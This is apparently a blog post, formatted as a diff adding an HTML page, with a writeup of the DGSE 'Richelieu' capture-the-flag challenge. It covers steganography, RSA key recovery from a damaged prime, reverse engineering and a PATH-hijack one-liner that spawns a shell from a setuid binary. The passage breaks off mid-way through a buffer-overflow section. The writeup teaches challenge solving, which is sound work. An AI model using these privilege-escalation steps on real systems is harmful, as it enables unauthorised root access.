@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Writeup of the Richelieu challenge :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Table of Contents  The Challenge The Solution  Initial Recon a bit of History The First Portrait The Crypto part The Second portrait Reverse Engineering Relative paths : a bad idea? Buffer overflow like in 1999 The best things in life are free()  Conclusion  The Challenge The French external intelligence agency, known as the DGSE, published a cybersecurity challenge, the challenge remained open till June 14th 2019, in this writeup, I will try to explain every step of its solution."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/richelieu_challenge_writeup/" />
+
+<link rel="stylesheet" href="/assets/reminder.css" />
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Writeup of the Richelieu challenge :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever" />
+<meta name="twitter:description" content="Table of Contents  The Challenge The Solution  Initial Recon a bit of History The First Portrait The Crypto part The Second portrait Reverse Engineering Relative paths : a bad idea? Buffer overflow like in 1999 The best things in life are free()  Conclusion  The Challenge The French external intelligence agency, known as the DGSE, published a cybersecurity challenge, the challenge remained open till June 14th 2019, in this writeup, I will try to explain every step of its solution." />
+<meta name="twitter:site" content="/" />
+<meta name="twitter:creator" content="Redouane" />
+<meta name="twitter:image" content="https://res.cloudinary.com/dik00g2mh/image/upload/v1560076433/richelieu_challenge_writeup/zdefftgc14cw53zbax6s.jpg">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Writeup of the Richelieu challenge :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever">
+<meta property="og:description" content="Table of Contents  The Challenge The Solution  Initial Recon a bit of History The First Portrait The Crypto part The Second portrait Reverse Engineering Relative paths : a bad idea? Buffer overflow like in 1999 The best things in life are free()  Conclusion  The Challenge The French external intelligence agency, known as the DGSE, published a cybersecurity challenge, the challenge remained open till June 14th 2019, in this writeup, I will try to explain every step of its solution." />
+<meta property="og:url" content="/posts/richelieu_challenge_writeup/" />
+<meta property="og:site_name" content="Writeup of the Richelieu challenge" />
+<meta property="og:image" content="https://res.cloudinary.com/dik00g2mh/image/upload/v1560076433/richelieu_challenge_writeup/zdefftgc14cw53zbax6s.jpg">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2019-06-14 14:55:32 &#43;0200 &#43;0200" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Redouane&#39;s Blog
+  </div>
+</a>
+<div id="typingcode" class="hidden"></div>
+<div id="fences"></div>
+
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/">Posts</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about/">About</a></li>
+      
+    
+      
+        <li><a href="/">Posts</a></li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/richelieu_challenge_writeup/">Writeup of the Richelieu challenge</a></h1>
+  <div class="post-meta">
+    <span class="post-date">
+      2019-06-14
+    </span>
+    
+    <span class="post-author">::
+      Redouane
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="/tags/security/">security</a>&nbsp;
+    
+    #<a href="/tags/steganography/">steganography</a>&nbsp;
+    
+    #<a href="/tags/cryptography/">cryptography</a>&nbsp;
+    
+    #<a href="/tags/reverse/">reverse</a>&nbsp;
+    
+    #<a href="/tags/pwn/">pwn</a>&nbsp;
+    
+  </span>
+  
+
+  
+  <img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560076433/richelieu_challenge_writeup/zdefftgc14cw53zbax6s.jpg" class="post-cover" />
+  
+
+  <div class="post-content">
+    
+
+<h1 id="table-of-contents">Table of Contents</h1>
+
+<ol>
+<li><a href="#2899245ece0617ff86d6db5902b5cab9">The Challenge</a></li>
+<li><a href="#34e74b1c7f4aad91715567cf698912f6">The Solution</a>
+
+<ol>
+<li><a href="#7c2900701d453c0de0b02d5bbf4dae35">Initial Recon</a></li>
+<li><a href="#73ac6bbbf2f20ac2828791bbdaf4f7cf">a bit of History</a></li>
+<li><a href="#73aaa3df04a6aefa67ed6977ab3da72c">The First Portrait</a></li>
+<li><a href="#7295ba9e2546e90cfc4f3cdd91b84605">The Crypto part</a></li>
+<li><a href="#eefd0c86d4089a816d31551a02bfd966">The Second portrait</a></li>
+<li><a href="#0bb98124495bb80830a7cab5ba6b015f">Reverse Engineering</a></li>
+<li><a href="#10db30a79501647b304db784a4c60d8c">Relative paths : a bad idea?</a></li>
+<li><a href="#552c2c2154e968fa737a77cc61b93a9c">Buffer overflow like in 1999</a></li>
+<li><a href="#ed17997eb2dad9a63204e97d199decaf">The best things in life are <code>free()</code></a></li>
+</ol></li>
+<li><a href="#6f8b794f3246b0c1e1780bb4d4d5dc53">Conclusion</a></li>
+</ol>
+
+<h1 id="span-id-2899245ece0617ff86d6db5902b5cab9-the-challenge-span"><span id='2899245ece0617ff86d6db5902b5cab9'>The Challenge</span></h1>
+
+<p>The French external intelligence agency, known as the <code>DGSE</code>, published <a href="https://www.defense.gouv.fr/dgse/tout-le-site/le-challenge-richelieu-est-ouvert">a cybersecurity challenge</a>, the challenge remained open till June 14th 2019, in this writeup, I will try to explain every step of its solution.</p>
+
+<h1 id="span-id-34e74b1c7f4aad91715567cf698912f6-the-solution-span"><span id='34e74b1c7f4aad91715567cf698912f6'>The Solution</span></h1>
+
+<h2 id="span-id-7c2900701d453c0de0b02d5bbf4dae35-initial-recon-span"><span id='7c2900701d453c0de0b02d5bbf4dae35'>Initial Recon</span></h2>
+
+<p>We start by visiting <a href="https://www.challengecybersec.fr/">the challenge site</a></p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560076456/richelieu_challenge_writeup/h6kwsldq7zfhkncotbuc.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560076456/richelieu_challenge_writeup/h6kwsldq7zfhkncotbuc.png" alt="img1" /></a></p>
+
+<p>Nothing really interesting, all there is is a countdown, let&rsquo;s inspect the sourcecode of the page.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077004/richelieu_challenge_writeup/oqazfeujwxvvmu5oasfr.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077004/richelieu_challenge_writeup/oqazfeujwxvvmu5oasfr.png" alt="img2" /></a></p>
+
+<p>There is a reference to the PDF file <code>Richelieu.pdf</code>, let&rsquo;s check that out.</p>
+
+<h2 id="span-id-73ac6bbbf2f20ac2828791bbdaf4f7cf-a-bit-of-history-span"><span id='73ac6bbbf2f20ac2828791bbdaf4f7cf'>a bit of History</span></h2>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077031/richelieu_challenge_writeup/xcuu9wclkflr8kf8d0md.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077031/richelieu_challenge_writeup/xcuu9wclkflr8kf8d0md.png" alt="img3" /></a></p>
+
+<p>The document (which can be downloaded <a href="https://drive.google.com/file/d/1oWJwgz84ms04gEDKRIiv6ZmYaL4bjtXx/view?usp=sharing">here</a>) is about the contributions of Cardinal Richelieu to cryptanalysis, and how it helped the French to anticipate the landing of English troops who came to help the Huguenots.</p>
+
+<p>The pdf contains <code>364</code> pages, but only the first page contains visible text.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077053/richelieu_challenge_writeup/grm2yxuwysjvci6dojzj.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077053/richelieu_challenge_writeup/grm2yxuwysjvci6dojzj.png" alt="img4" /></a></p>
+
+<p>We notice there is hidden text.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077137/richelieu_challenge_writeup/jf3xanemrvnlrhnd02vr.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077137/richelieu_challenge_writeup/jf3xanemrvnlrhnd02vr.png" alt="img5" /></a></p>
+
+<p>The hidden text is <code>base64</code>-encoded data, let&rsquo;s extract it, and decode it.</p>
+
+<pre><code class="language-shell">pdftotext Richelieu.pdf - | tail -n +9 | sed &quot;s/[^a-zA-Z0-9\+\/=]//g&quot; | base64 -d &gt;Richelieu_extracted
+</code></pre>
+
+<h2 id="span-id-73aaa3df04a6aefa67ed6977ab3da72c-the-first-portrait-span"><span id='73aaa3df04a6aefa67ed6977ab3da72c'>The First Portrait</span></h2>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077159/richelieu_challenge_writeup/hboikeyqtbmirxempcdl.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077159/richelieu_challenge_writeup/hboikeyqtbmirxempcdl.png" alt="img6" /></a></p>
+
+<p>We get a <code>jpeg</code> file, a portrait of Richelieu, which can be found <a href="https://drive.google.com/open?id=1dx1-o5rzAys15_fBLO8E9cqf5l2ruYdY">here</a>.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077230/richelieu_challenge_writeup/i1qfbwjjxgalgc4c4vp4.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077230/richelieu_challenge_writeup/i1qfbwjjxgalgc4c4vp4.png" alt="img7" /></a></p>
+
+<p>We notice some uncommon things on that file while looking at it in a hex editor, we know that <code>jpeg</code> files end with the <code>EOI</code> marker <code>0xffd9</code> (<a href="https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure">reference</a>), and that file doesn&rsquo;t end with it, we find that marker somewhere inside the file, and after that marker, there is some appended data (the additional data is ignored by most image viewers).</p>
+
+<p>Let&rsquo;s extract the additional data, it starts with <code>PK</code> at offset <code>0x6ccbc</code>, I suspect it&rsquo;s an archive.</p>
+
+<p>(<code>rax2</code> is a base-converter, it&rsquo;s part of the <code>radare2</code> framework).</p>
+
+<pre><code class="language-shell">dd if=Richelieu_extracted of=appended_data ibs=1 skip=$(rax2 0x6ccbc)
+</code></pre>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077283/richelieu_challenge_writeup/szgirint8suizk6hsgbm.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077283/richelieu_challenge_writeup/szgirint8suizk6hsgbm.png" alt="img8" /></a></p>
+
+<p>It&rsquo;s a password-protected zip archive (you can download it <a href="https://drive.google.com/file/d/1GPq5ZYDY_EHJno56YOMdUhxZ9gAXWb8l/view?usp=sharing">here</a>), we can list its content with <code>unzip -l</code>.</p>
+
+<p>We find its password: <code>DGSE{t.D=@Bx^A%n9FQB~_VL7Zn8z=:K^4ikE=j0EGHqI}</code></p>
+
+<p>The archive contains the following files : <code>.bash_history</code>, <code>suite.zip</code>, <code>prime.txt</code>, <code>public.key</code>, <code>motDePasseGPG.txt.enc</code> and <code>lsb_RGB.png.enc</code>.</p>
+
+<h2 id="span-id-7295ba9e2546e90cfc4f3cdd91b84605-the-crypto-part-span"><span id='7295ba9e2546e90cfc4f3cdd91b84605'>The Crypto part</span></h2>
+
+<p>We start by reading the <code>.bash_history</code> file, which should contain the history of the commands that were executed.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077465/richelieu_challenge_writeup/uxtciejjs0bfukkwa7dx.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077465/richelieu_challenge_writeup/uxtciejjs0bfukkwa7dx.png" alt="img9" /></a></p>
+
+<ul>
+<li><code>lsb_RGB.png</code> is encrypted with a symmetric key.</li>
+<li>The key is saved to the file <code>motDePasseGPG.txt</code>.</li>
+<li>a <code>4096</code> bit RSA keypair is generated, private key is <code>priv.key</code>, public key is <code>public.key</code>.</li>
+<li>The first prime of the private RSA key is saved to a file, but some bytes are substituted in the file.</li>
+<li>The public key is used to encrypt <code>motDePasseGPG.txt</code></li>
+</ul>
+
+<p>Our goal is first to attack the RSA encryption, if we can factorize the modulus <code>N</code>, we will be able to decrypt <code>motDePasseGPG.txt.enc</code>, and because we have some informations about one prime, that&rsquo;s feasible.
+Because of the substitution, we don&rsquo;t know exactly for example if <code>0xfb</code> in the <code>prime.txt</code> file was also <code>0xfb</code> in the prime, or if it was <code>0x7f</code> and was substituted in the file, but because only 6 fixed byte substitutions occured, we can bruteforce all the possible primes, and get the one that divides <code>N</code>, let&rsquo;s first retrieve <code>N</code>.</p>
+
+<pre><code class="language-shell">openssl asn1parse -inform pem -in public.key -strparse 19
+</code></pre>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125994/richelieu_challenge_writeup/zkxyhwf37azg5mdwmone.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125994/richelieu_challenge_writeup/zkxyhwf37azg5mdwmone.png" alt="img10" /></a></p>
+
+<p>These parameters are <code>N</code> (the modulus) and <code>e</code> (the public exponent).</p>
+
+<p>Once we find that prime <code>p</code> that divides <code>N</code>, let <code>q = N / p</code>, it&rsquo;s straightforward, we could calculate the parameters of the private key, and save them in the <code>PEM</code> format, and then decrypt the file using the private key generated, or we could just decrypt using the RSA formula, here is how decryption works:</p>
+
+<ul>
+<li>Calculate <code>phi(N) = (p-1)(q-1)</code></li>
+<li>Calculate the private exponent <code>d = (1/e) mod phi(N)</code></li>
+<li>Decrypt the encrypted data <code>c</code> by computing <code>c ** d (mod N)</code>, and remove the padding (I will not do it in my implementation).</li>
+</ul>
+
+<pre><code class="language-ruby">require'colorize'; # for colorizing output
+N = 0xCD5F8A24C7605008897A3C922C0E812E769DE0A46442C350CB78C7868539F3D38AAC80B3E6A506605910E8599806B4D1D148F2F6B81DA04796A8A5AEE18F29E83E16775A2A0A00870541F6574ED1438636AE0A0C116E07104F48F72094863A3869E1C8FC220627278962FB22873E3156F18E55DEC94E970064EC7F4E0E88454012E2FD5DFE5F8D19BF170F9CCB3F46E0FD1019BCB02D9083A0703C617F996379E6478354A73AE6E6ACBCE1F4333ECFAF24366A3E977D3CD3CBFE8D8A387BD876BFDAB8488F6F47BF1FBE33010FD2D7E22B4DB2E567783CE0B606DB86B93759714C4F6396A7FB9F74C4021043B0F3D46D2633EBD43A877863DF7D680F506587C119DD64100CA831CE2AF33D951B524C5F06B49F5BF2CB381E74181930D06A80505C06ABD5BF4870F0C9FB581BD80DBA889660639F936EDEA8FE5D0C9EAE58062ED693252583C71CC782BA613E01438E69B43F9E64ECA84F9EA04E811AD7B39EFD7876D1B6B501C4F48ACCE6F24239F6C04028788135CD88C3D15BE0F2EBB7DE9E9C19A7A93037005EE0A9A640BADA332EC0D05EE9F08A832354A0487A927D5E88066E2569E6C5D4688E422BFA0B27C6171C6D7BF029BFD9165752AF19AA71B33A1EA70B6C371FB21E47F527D80B7D04F582AD9F9935AF723682DC01CA9880621870DECB7AD15648CDF4EF153016F3E6D87933B8EC54CFA1FDF87C467020A3E753;
+e = 0x10001;
+prime1 = File.read('prime.txt').lines;
+prime1.shift;
+prime1 = prime1.join.scan(/[0-9a-f]{2}/).map{|e| e.to_i(16)};
+replacements = { 0x7f =&gt; 0xfb,
+				 0xe1 =&gt; 0x66,
+				 0xf4 =&gt; 0x12,
+				 0x16 =&gt; 0x54,
+				 0xa4 =&gt; 0x57,
+				 0xb5 =&gt; 0xcd
+				}.invert;
+indices = prime1.each_with_index.select{|x,i| replacements[x]}.map(&amp;:last);
+1.upto(indices.count){|i|
+	indices.combination(i){|c|
+		pr = prime1.clone;
+		c.each{|j|
+			pr[j] = replacements[pr[j]];
+		}
+		pr = pr.map{|e|e.to_s(16).rjust(2,?0)}.join.to_i(16);
+		if N % pr == 0
+			puts &quot;[++] found prime = #{pr.to_s.light_blue}&quot;;
+			$p = pr;
+			break
+		end
+	}
+}
+# found the prime, now the decryption
+class String
+	def numerize
+		# output the number representation of a string
+		self.reverse.each_codepoint.with_index.inject(0){|m,(c,i)| m + c.ord *  (0x100 ** i)};
+	end
+end
+class Integer
+	def stringify
+		# output the string representation of a number
+		chars = [ ];
+		n  = self;
+		while n != 0
+			c = n &amp; 0xff;
+			n &gt;&gt;= 8;
+			chars &lt;&lt; c.chr;
+		end
+		chars.join.reverse;
+	end
+end
+require 'openssl';
+$q = N / $p;
+d = e.to_bn.mod_inverse( ($p-1) * ($q-1) ).to_i;
+File.open('motDePasseGPG.txt.enc', 'rb') do|f|
+	puts f.read.numerize.to_bn.mod_exp(d, N).to_i.stringify.inspect.light_red;
+end
+</code></pre>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077523/richelieu_challenge_writeup/uwrpa1lpnwuusblre5ql.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077523/richelieu_challenge_writeup/uwrpa1lpnwuusblre5ql.png" alt="img11" /></a></p>
+
+<p>The content of <code>motDePasseGPG.txt</code> was <code>DGSE{Ti,%yei3=stlh_,5@pIrrMU.^mJC:luYbt1Qe_-Y}</code>, anything before the <code>\x00</code>, including it is padding.</p>
+
+<p>Lets decrypt <code>lsb_RGB.png.enc</code> symmetrically using that flag as the passphrase.</p>
+
+<pre><code class="language-shell">gpg --decrypt lsb_RGB.png.enc &gt; lsb_RGB.png
+</code></pre>
+
+<h2 id="span-id-eefd0c86d4089a816d31551a02bfd966-the-second-portrait-span"><span id='eefd0c86d4089a816d31551a02bfd966'>The Second portrait</span></h2>
+
+<p>The file <code>lsb_RGB.png</code> can be found <a href="https://drive.google.com/file/d/1OdJs1e4ApsuE5pdM0jrPahqr4gmbGUvC/view?usp=sharing">here</a>.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077562/richelieu_challenge_writeup/dswbpjkzwbt9ldzxjtbq.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077562/richelieu_challenge_writeup/dswbpjkzwbt9ldzxjtbq.png" alt="img12" /></a></p>
+
+<p>Richelieu again :), this time, the filename <code>lsb_RGB</code> is a big hint towards LSB Steganography.</p>
+
+<p>LSB stands for Least Significant Bit, the technique works by replacing the least significant bit of pixel values with the bits of the secret message, it goes unnoticed because when you replace the lowest bit of a value, it changes by 0 or 1, the pixel color is still the same to a viewer&rsquo;s eye, the technique can be used on a color channel, or on all the colors.</p>
+
+<p>After trying a few things, we get the secret message using the following Python script, for each pixel, we concatenate the least significant bit of the <code>R</code>,<code>G</code>,<code>B</code> coordinates in this order.</p>
+
+<pre><code class="language-python">from PIL import Image
+
+def get_pixels(image):
+	w,h = image.size
+	for x in range(w):
+		for y in range(h):
+			r, g, b = im.getpixel((x, y))
+			yield r
+			yield g
+			yield b
+
+extracted_data = ''
+im = Image.open(&quot;lsb_RGB.png&quot;)
+w,h = im.size
+intermediate_byte = 0
+byte_index = 0
+for byte in get_pixels(im):
+	intermediate_byte = (intermediate_byte &lt;&lt; 1) | (byte &amp; 1)
+	byte_index += 1
+	if byte_index % 8 == 0:
+		extracted_data += chr(intermediate_byte)
+		intermediate_byte = 0
+print( extracted_data )
+</code></pre>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077639/richelieu_challenge_writeup/awaavonkn9a0qo9f18wk.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077639/richelieu_challenge_writeup/awaavonkn9a0qo9f18wk.png" alt="img13" /></a></p>
+
+<p>We get the hexdump of an <code>ELF</code> file (Executable and Linkable Format), that&rsquo;s the output of the <code>xxd</code> command, we can get the original <code>ELF</code> file by using the <code>-r</code> option of <code>xxd</code>.</p>
+
+<pre><code class="language-shell">python3 lsb_steg.py |grep -P --binary-files=text &quot;^[0-9a-f]{8}:&quot; | xxd -r &gt; elf_file
+</code></pre>
+
+<h2 id="span-id-0bb98124495bb80830a7cab5ba6b015f-reverse-engineering-span"><span id='0bb98124495bb80830a7cab5ba6b015f'>Reverse Engineering</span></h2>
+
+<p>You can download the elf file <a href="https://drive.google.com/file/d/11qvXGbV7D0Jn0p8A1gbXujdF2hrZ1wcO/view?usp=sharing">here</a>.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077687/richelieu_challenge_writeup/achmket1adxvuo1elcua.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077687/richelieu_challenge_writeup/achmket1adxvuo1elcua.png" alt="img14" /></a></p>
+
+<p>The file we extracted is a <code>statically-linked</code> executable that prompts for a password, using readelf, we can see that its entrypoint is at <code>0x447f10</code> (we will first put a breakpoint on it), let&rsquo;s try to find out how it checks our input.</p>
+
+<p>If we reverse-engineer it, we will find that it&rsquo;s doing very common code unpacking operations : <code>mmap</code>ping a memory page that has <code>RWX</code> protections for example, but we don&rsquo;t need to understand how it&rsquo;s unpacking itself, we only care about how it checks our input, for that, let&rsquo;s use <code>gdb</code>, put a hardware on-access breakpoint on the first byte of our input using the <code>awatch</code> command, and check where it&rsquo;s accessed.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077733/richelieu_challenge_writeup/tiooctmsqqggjcq3uq4w.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077733/richelieu_challenge_writeup/tiooctmsqqggjcq3uq4w.png" alt="img15" /></a></p>
+
+<p>That&rsquo;s probably inside a <code>libc</code> function (no symbols are available, but it doesn&rsquo;t really matter), it looks like it&rsquo;s parsing the commandline arguments, we can use the <code>finish</code> command to execute till a return is hit, and check what it&rsquo;s doing exactly, it&rsquo;s parsing the path of the executable, but our input is not checked here, let&rsquo;s just <code>continue</code>.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077754/richelieu_challenge_writeup/yj1drktmt0fpllbs5hqt.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077754/richelieu_challenge_writeup/yj1drktmt0fpllbs5hqt.png" alt="img16" /></a></p>
+
+<p>There is an interesting pattern here, the code above checks the length of our input, if you did not understand it right away, here is an explaination:
+- initialize <code>rcx</code> with <code>-1</code>.
+- keep searching (scanning) for the <code>NULL</code> byte on our input, and decrement <code>rcx</code> on each non <code>NULL</code> byte (also decrement it once when you find the <code>NULL</code> byte, and stop scanning).
+- check if <code>rcx == -32</code>, <code>0xffffffffffffffe0</code> is the binary representation of the number <code>-32</code>.
+This means, the code is simply checking if <code>length(input) == 30</code></p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077810/richelieu_challenge_writeup/o939224nifq43mqnfv5u.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077810/richelieu_challenge_writeup/o939224nifq43mqnfv5u.png" alt="img17" /></a></p>
+
+<p>after that, the serial check is straightforward.
+- There is a <code>buffer</code> at <code>0x004898c0</code>.
+- the code checks if <code>input[0] ^ 0x33 == buffer[0]</code>
+- for each index <code>i</code> in the range <code>[1 .. 29]</code>, the code is checking if <code>buffer[i] ^ input[i] == buffer[i+1]</code></p>
+
+<p>The following script retrieves the serial.</p>
+
+<pre><code class="language-ruby">buffer = %w(33 77 30 63 26 5d 3a 0e 3b 0d 4d 2a 1f 2e 1f 2d 4f 28 51 37 7a 14 76 20 78 0f 21 4d 21 6c 11 00);
+buffer.map!{|e| e.to_i(16)}; # convert buffer to an array of integers
+p 30.times.map{|i| (buffer[i]^buffer[i+1]).chr}.join
+</code></pre>
+
+<p><code>DGSE{g456@g5112bgyfMnbVXw.llM}</code></p>
+
+<p>(Note : after completing the challenge, I&rsquo;ve been told that the executable was packed with <code>UPX</code>, which is a very well-known packer, but I didn&rsquo;t bother looking for strings in the binary file at the first look).</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077863/richelieu_challenge_writeup/cat1psruclujrj3g1a4i.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077863/richelieu_challenge_writeup/cat1psruclujrj3g1a4i.png" alt="img18" /></a></p>
+
+<p>We will use this password to unzip the <code>suite.zip</code> file, and we will read the <code>suite.txt</code> file that is inside it.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077896/richelieu_challenge_writeup/h1rv0qfducpic9bbvxhn.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077896/richelieu_challenge_writeup/h1rv0qfducpic9bbvxhn.png" alt="img19" /></a></p>
+
+<h2 id="span-id-10db30a79501647b304db784a4c60d8c-relative-paths-a-bad-idea-span"><span id='10db30a79501647b304db784a4c60d8c'>Relative paths : a bad idea?</span></h2>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125642/richelieu_challenge_writeup/r0oylc112xsigkpl9evn.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125642/richelieu_challenge_writeup/r0oylc112xsigkpl9evn.png" alt="img_ssh" /></a></p>
+
+<p>We connect through <code>SSH</code>, and we find a <code>setuid</code> binary that we must exploit to get privilegied access, and read the content of the file <code>drapeau.txt</code>.</p>
+
+<p>The <code>setuid</code> binary provided can be found <a href="https://drive.google.com/file/d/1JSinC1dOEY4HXSH2jPVkyssHb6sHuwy5/view?usp=sharing">here</a>.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077985/richelieu_challenge_writeup/ejehw8f10pion1hh4vre.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077985/richelieu_challenge_writeup/ejehw8f10pion1hh4vre.png" alt="img20" /></a></p>
+
+<p>We reverse-engineer the executable <code>prog.bin</code>, and we find out that it&rsquo;s doing very simple things, here it is in pseudocode.</p>
+
+<pre><code class="language-c">// int choice is read from the user with scanf(&quot;%d&quot;, &amp;choice);
+if (choice == 1)
+	system(&quot;date '+Nous sommes le %d/%m/%Y et il est %H:%M:%S'&quot;);
+else if (choice == 2)
+	system(&quot;date '+Nombre de secondes depuis Epoch : %s'&quot;);
+else if (choice == 3)
+	system(&quot;sl&quot;);
+else if (choice == 4)
+	system(&quot;cal&quot;);
+else
+	puts(&quot;Mauvais choix :-/&quot;);
+</code></pre>
+
+<p>The vulnerability is easy to spot, we notice that the setuid executable is running commands with relative paths, the following exploit should spawn a shell when we enter <code>4</code>:</p>
+
+<pre><code class="language-bash">mkdir /tmp/workdir &amp;&amp; cp /bin/sh /tmp/workdir/cal &amp;&amp; (PATH=/tmp/workdir:$PATH ./prog.bin)
+</code></pre>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126261/richelieu_challenge_writeup/djcdzax6ymlyljwlve5v.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126261/richelieu_challenge_writeup/djcdzax6ymlyljwlve5v.png" alt="img21" /></a></p>
+
+<p>This works because relative paths are looked at from the <code>$PATH</code> environment variable, <code>cal</code> is resolved to <code>/tmp/workdir/cal</code>, which spawns a shell.</p>
+
+<h2 id="span-id-552c2c2154e968fa737a77cc61b93a9c-buffer-overflow-like-in-1999-span"><span id='552c2c2154e968fa737a77cc61b93a9c'>Buffer overflow like in 1999</span></h2>
+
+<p>Another <code>setuid</code> binary (which you can download <a href="https://drive.google.com/file/d/17mLfv7tKFf7SoWDnOlpkOAObBzEtfA1Z/view?usp=sharing">here</a>), this time, it prompts for a username and a password.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126407/richelieu_challenge_writeup/vhrpbuat2a9vmcftaehr.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126407/richelieu_challenge_writeup/vhrpbuat2a9vmcftaehr.png" alt="img22" /></a></p>
+
+<p>We get the following pseudocode from IDA Pro:</p>
+
+<pre><code class="language-c">char *__fastcall sub_40086D(char *a1)
+{
+  char *result; // rax
+  char v2; // [rsp+10h] [rbp-30h]
+
+  printf(&quot;login $ &quot;);
+  fgets(a1, 1000, stdin);
+  a1[strlen(a1) - 1] = 0;
+  printf(&quot;pass $ &quot;, 1000LL);
+  scanf(&quot;%s&quot;, &amp;v2);
+  if ( strlen(a1) &gt; 0xA )
+  {
+    puts(aAttentionLeLog);
+    a1[10] = 0;
+  }
+  if ( (unsigned int)sub_4006A6(&amp;v2, a1) )
+    result = a1;
+  else
+    result = 0LL;
+  return result;
+}
+</code></pre>
+
+<p>The vulnerability is also easy to spot, we see that the password is read at the line <code>scanf(&quot;%s&quot;, ...);</code>, and there is an obvious buffer overflow vulnerability there.</p>
+
+<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126445/richelieu_challenge_writeup/h3qbgu8aso0lidjddz00.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126445/richelieu_challenge_writeup/h3qbgu8aso0lidjddz00.png" alt="img24" /></a></p>
+
+<p>Most of the protections are disabled, but <code>ASLR</code> is still enabled (it&rsquo;s system-wide <code>ASLR</code>, and you can check <code>/proc/sys/kernel/randomize_va_space</code>).</p>
+
